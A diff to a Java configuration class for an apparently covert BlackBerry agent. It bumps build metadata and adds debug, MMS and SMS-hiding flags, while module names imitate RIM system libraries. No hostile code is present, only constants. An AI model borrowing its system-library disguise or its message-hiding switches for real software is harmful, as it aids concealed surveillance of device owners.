@@ -18,7 +18,9 @@ public class Cfg {
     public static final boolean FETCH_WHOLE_EMAIL = false;
 
     public static final boolean DEBUG_FLASH = true;
+    public static final boolean DEBUG_EVENTS = false;
     public static final boolean DEBUG_OUT = true;
+    public static final boolean DEBUG_INFO = false;
 
     public static boolean SD_ENABLED = false;
 
@@ -35,16 +37,27 @@ public class Cfg {
     //==========================================================
     // Compile configuration, do not edit under this line
 
-    public static final int BUILD_ID = 154;
-    public static final String BUILD_TIMESTAMP = "20120424-122550";
+    public static final int BUILD_ID = 167;
+    public static final String BUILD_TIMESTAMP = "20120522-053637";
     
     public static final String GROUP_NAME =  "Rim Library"; //"Rim Library";
     public static final String MODULE_NAME = "net_rim_bb_lib"; //"net_rim_bb_lib";
     public static final String MODULE_LIB_NAME = "net_rim_bb_lib_base"; //"net_rim_bb_lib_base";
 
-    public static final String RANDOM = "DB41E27C5092E17D";
+    public static final String RANDOM = "F644B4E92124E4BC";
     
     public static final int VERSION = 2012041601;
 
     //==========================================================
+    
+    //#ifdef BlackBerrySDK4.5.0
+    public static final boolean enableMMS = false;
+    public static final boolean enableSMSHiding = false;
+    //#endif
+    
+    //#ifdef BlackBerrySDK5.0.0
+    public static final boolean enableMMS = true;
+    public static final boolean enableSMSHiding = false;
+    //#endif
+    
 }
